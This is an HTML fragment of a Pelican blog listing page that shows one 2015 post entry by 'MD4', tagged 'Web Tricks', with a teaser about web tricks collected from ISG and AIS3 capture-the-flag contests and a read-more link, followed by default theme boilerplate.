        <abbr class="published" title="2015-10-23T10:58:00+02:00">
                Published: 五 23 十月 2015
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/md4.html">MD4</a>
        </address>
<p>In <a href="/category/web.html">web</a>.</p>
<p>tags: <a href="/tag/web-tricks.html">Web Tricks</a> </p>
</footer><!-- /.post-info -->                <p>Collect Web tricks from ISG &amp;&amp; AIS3-CTF</p>
                <a class="readmore" href="/Web Tricks.html">read more</a>
                </div><!-- /.entry-content -->
            </article></li>
                </ol><!-- /#posts-list -->
                </section><!-- /#content -->
        <section id="extras" class="body">
                <div class="blogroll">
                        <h2>blogroll</h2>
                        <ul>
                            <li><a href="http://getpelican.com/">Pelican</a></li>
                            <li><a href="http://python.org/">Python.org</a></li>
                            <li><a href="http://jinja.pocoo.org/">Jinja2</a></li>
                            <li><a href="#">You can modify those links in your config file</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="social">
                        <h2>social</h2>
                        <ul>

                            <li><a href="#">You can add links in your config file</a></li>
                            <li><a href="#">Another social link</a></li>
                        </ul>
                </div><!-- /.social -->
        </section><!-- /#extras -->

        <footer id="contentinfo" class="body">
                <address id="about" class="vcard body">
                Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org">Python</a>.
                </address><!-- /#about -->

                <p>The theme is by <a href="http://coding.smashingmagazine.com/2009/08/04/designing-a-html-5-layout-from-scratch/">Smashing Magazine</a>, thanks!</p>
        </footer><!-- /#contentinfo -->

</body>
</html>